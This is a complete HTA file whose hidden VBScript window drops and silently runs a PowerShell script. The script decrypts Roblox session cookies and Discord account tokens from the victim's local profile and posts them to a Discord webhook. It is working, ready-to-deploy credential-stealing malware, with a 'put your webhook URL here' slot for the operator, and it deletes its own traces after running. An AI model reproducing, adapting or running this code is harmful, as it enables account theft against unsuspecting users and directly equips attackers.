<html><head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
window.resizeTo 0,0:window.moveTo -2000,-2000
On Error Resume Next

Dim sh, fso, WH
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' ==========================================
' PUT YOUR WEBHOOK URL HERE (KEEP THE QUOTES)
' ==========================================
WH = "https://discord.com/api/webhooks/1568136262374793286/U6lNQnkvy-NdMd-nOUZQ77wuTTAiFy2SMwMP_kHcPKuKuEw9ERvyGUOHzvRSydAKrqas"

Call PostEmbed(":satellite: Hit", "PC: " & sh.ExpandEnvironmentStrings("%COMPUTERNAME%"), 3447003)

' 1. Create the PowerShell script
Dim psPath : psPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\s.ps1"
Dim f : Set f = fso.CreateTextFile(psPath, True)

f.WriteLine "$W = """ & WH & """"
f.WriteLine "function Post($t,$d){ $j = @{embeds=@(@{title=$t;description=$d;color=65280})}|ConvertTo-Json -Depth 4; Invoke-RestMethod $W -Method Post -Body $j -ContentType 'application/json' }"
f.WriteLine "$l = $env:LOCALAPPDATA; $a = $env:APPDATA;"
f.WriteLine "' --- Roblox ---"
f.WriteLine "$rp = ''; if (Test-Path ""$l\Roblox\LocalStorage\robloxcookies.dat"") { $rp = ""$l\Roblox\LocalStorage\robloxcookies.dat"" } elseif (Test-Path ""$a\Roblox\LocalStorage\robloxcookies.dat"") { $rp = ""$a\Roblox\LocalStorage\robloxcookies.dat"" }"
f.WriteLine "if ($rp) {"
f.WriteLine "  try {"
f.WriteLine "    $r = Get-Content $rp -Raw"
f.WriteLine "    if ($r -match '""CookiesData""\s*:\s*""([^""]+)""') {"
f.WriteLine "      $b = [Convert]::FromBase64String($Matches[1])"
f.WriteLine "      $db = [Security.Cryptography.ProtectedData]::Unprotect($b, $null, 'CurrentUser')"
f.WriteLine "      $c = [Text.Encoding]::UTF8.GetString($db)"
f.WriteLine "      if ($c -match '\.ROBLOSECURITY\s*=\s*(_[^;\s]+)') {"
f.WriteLine "        Post 'Roblox Cookie' $Matches[1]"
f.WriteLine "      } else { Post 'Roblox Error' 'No cookie string found in decrypted data' }"
f.WriteLine "    } else { Post 'Roblox Error' 'No CookiesData found in file' }"
f.WriteLine "  } catch { Post 'Roblox Error' $_.Exception.Message }"
f.WriteLine "}"
f.WriteLine "' --- Discord ---"
f.WriteLine "try {"
f.WriteLine "  $ls = Get-Content ""$a\discord\Local State"" -Raw | ConvertFrom-Json"
f.WriteLine "  $b = [Convert]::FromBase64String($ls.os_crypt.encrypted_key)"
f.WriteLine "  $mk = [Security.Cryptography.ProtectedData]::Unprotect($b[5..($b.Length-1)], $null, 'CurrentUser')"
f.WriteLine "  $tokens = @{}"
f.WriteLine "  foreach ($dp in @(""$a\discord\Local Storage\leveldb"",""$a\discordptb\Local Storage\leveldb"",""$a\discordcanary\Local Storage\leveldb"")) {"
f.WriteLine "    if (!(Test-Path $dp)) { continue }"
f.WriteLine "    Get-ChildItem $dp | ? { $_.Name -match '\.(ldb|log)$' } | % {"
f.WriteLine "      $raw = $null"
f.WriteLine "      try {"
f.WriteLine "        $fs = [IO.File]::Open($_.FullName, [IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::ReadWrite)"
f.WriteLine "        $sr = New-Object IO.StreamReader($fs); $raw = $sr.ReadToEnd(); $sr.Close(); $fs.Close()"
f.WriteLine "      } catch {}"
f.WriteLine "      if (!$raw) { return }"
f.WriteLine "      foreach ($m in [regex]::Matches($raw, 'dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,400})')) {"
f.WriteLine "        $b64 = $m.Groups[1].Value"
f.WriteLine "        while ($b64.Length % 4 -ne 0) { $b64 += '=' }"
f.WriteLine "        try {"
f.WriteLine "          $eb = [Convert]::FromBase64String($b64)"
f.WriteLine "          if ($eb.Length -lt 80) { continue }"
f.WriteLine "          $nonce = $eb[3..14]; $tag = $eb[($eb.Length-16)..($eb.Length-1)]; $ct = $eb[15..($eb.Length-17)]"
f.WriteLine "          $aes = New-Object System.Security.Cryptography.AesGcm($mk)"
f.WriteLine "          $pt = New-Object byte[] ($ct.Length)"
f.WriteLine "          $aes.Decrypt($nonce, $ct, $tag, $pt); $aes.Dispose()"
f.WriteLine "          $t = [Text.Encoding]::UTF8.GetString($pt).TrimEnd([char]0)"
f.WriteLine "          if ($t.Length -gt 40 -and !$tokens[$t]) { $tokens[$t] = $t }"
f.WriteLine "        } catch {}"
f.WriteLine "      }"
f.WriteLine "    }"
f.WriteLine "  }"
f.WriteLine "  foreach ($t in $tokens.Keys) { Post 'Discord Token' $t }"
f.WriteLine "} catch { Post 'Discord Error' $_.Exception.Message }"

f.Close

' 2. Run it hidden
sh.Run "powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -File """ & psPath & """", 0, True

' 3. Cleanup
fso.DeleteFile psPath, True
window.close()

Sub PostEmbed(t, d, c)
    Dim DQ: DQ = Chr(34)
    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
End Sub

Function Ej(s)
    Dim i, c, out
    out = ""
    For i = 1 To Len(s)
        c = Asc(Mid(s, i, 1))
        If c >= 32 Or c = 9 Or c = 10 Or c = 13 Then out = out & Mid(s, i, 1)
    Next
    out = Replace(out, Chr(92), Chr(92) & Chr(92))
    out = Replace(out, Chr(34), Chr(92) & Chr(34))
    out = Replace(out, vbCrLf, Chr(92) & "n")
    out = Replace(out, vbCr, Chr(92) & "n")
    out = Replace(out, vbLf, Chr(92) & "n")
    out = Replace(out, vbTab, Chr(92) & "t")
    Ej = out
End Function
</script>
</head><body></body></html>
